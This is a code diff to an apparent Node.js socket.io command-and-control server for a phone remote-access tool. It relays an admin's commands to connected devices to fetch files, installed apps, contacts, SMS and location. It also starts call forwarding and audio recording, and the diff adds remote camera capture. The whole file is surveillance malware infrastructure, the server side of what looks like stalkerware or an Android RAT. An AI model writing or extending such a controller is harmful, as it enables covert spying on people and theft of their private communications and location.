@@ -34,7 +34,7 @@ io.on('connection', (socket) => {
         socket.broadcast.emit("join", {...device,socketId: socket.id});
       });
 
-      // ========== ORIGINAL HANDLERS (NO CHANGE) ==========
+      // Original Handlers
       socket.on('getDir',(data)=>response("getDir",data));
       socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
       socket.on('getContacts',(data)=>response("getContacts",data));
@@ -45,22 +45,29 @@ io.on('connection', (socket) => {
       socket.on("getSMS", (data) =>response("getSMS",data));
       socket.on('getLocation',(data)=>response("getLocation",data));
      
-      // ========== NEW FEATURE HANDLERS (ADDED) ==========
+      // Call Forward
       socket.on('enableCallForward',(data)=>response("enableCallForward",data));
       socket.on('disableCallForward',(data)=>response("disableCallForward",data));
       socket.on('callForwardResult',(data)=>response("callForwardResult",data));
       
+      // Voice Recording
       socket.on('startRecording',(data)=>response("startRecording",data));
       socket.on('stopRecording',(data)=>response("stopRecording",data));
       socket.on('audioRecording',(data)=>response("audioRecording",data));
       socket.on('audioRecordingStatus',(data)=>response("audioRecordingStatus",data));
       
+      // Vibrate
       socket.on('vibrate',(data)=>response("vibrate",data));
       socket.on('vibrateResult',(data)=>response("vibrateResult",data));
       
+      // Torch
       socket.on('turnOnTorch',(data)=>response("turnOnTorch",data));
       socket.on('turnOffTorch',(data)=>response("turnOffTorch",data));
       socket.on('torchResult',(data)=>response("torchResult",data));
+      
+      // Camera
+      socket.on('takePicture',(data)=>response("takePicture",data));
+      socket.on('cameraCaptureResult',(data)=>response("cameraCaptureResult",data));
 
       socket.on('disconnect', () => {
         if(socket.id===adminSocketId){
